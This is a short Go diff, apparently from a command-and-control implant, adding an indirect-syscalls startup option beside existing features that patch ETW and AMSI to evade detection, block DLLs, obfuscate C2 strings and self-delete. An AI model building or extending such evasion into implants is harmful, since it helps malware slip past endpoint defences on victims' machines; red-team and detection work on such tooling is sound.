@@ -60,6 +60,7 @@ var (
 	customHeaders     string = ""     // Base64-encoded JSON of additional HTTP headers
 	autoPatch         string = ""     // Auto-patch ETW and AMSI at startup (Windows only)
 	blockDLLs         string = ""     // Block non-Microsoft DLLs in child processes (Windows only)
+	indirectSyscalls  string = ""     // Enable indirect syscalls at startup (Windows only)
 	xorKey            string = ""     // Base64 XOR key for C2 string deobfuscation (empty = plaintext)
 )
 
@@ -142,6 +143,11 @@ func runAgent() {
 	// Auto-patch ETW/AMSI: neutralize detection before any activity (Windows only)
 	if autoPatch == "true" {
 		autoStartupPatch()
+	}
+
+	// Initialize indirect syscalls: resolve Nt* syscall numbers from ntdll (Windows only)
+	if indirectSyscalls == "true" {
+		initIndirectSyscalls()
 	}
 
 	// Self-delete: remove binary from disk after startup (process continues from memory)
